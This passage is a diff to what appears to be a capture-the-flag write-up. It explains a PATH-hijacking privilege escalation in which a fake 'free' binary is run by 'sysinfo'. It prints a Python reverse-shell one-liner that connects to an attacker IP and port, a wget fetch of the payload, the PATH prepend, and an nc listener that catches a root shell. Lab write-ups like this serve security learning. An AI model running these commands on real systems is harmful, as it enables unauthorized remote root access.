@@ -333,15 +333,20 @@ How can we use this ? The plan is to make our own binary with our code (a revers
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.20",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ~~~
 
-2. Transfer it on the target:
+
+2. Transfer it on the target and make it executable:
 ~~~
 theseus@ubuntu:/var/tmp$ wget http://10.10.14.23/free
 theseus@ubuntu:/var/tmp$ chmod 755 free
+~~~
+
+3. Prepend the current directory or where the new _**"free"**_ executable is located to the PATH variable (this is the important part of this privilege escalation process), and run the _**"free"**_ executable to gain a root shell:
+~~~
 theseus@ubuntu:/var/tmp$ PATH=/var/tmp:$PATH
 theseus@ubuntu:/var/tmp$ sysinfo
 ~~~
 
-3. We have set a listener on the kali machine and we have a root shell:
+4. We have set a listener on the kali machine and we have a root shell:
 ~~~
 root@kali:~# nc -nlvp 1337
 Ncat: Version 7.80 ( https://nmap.org/ncat )
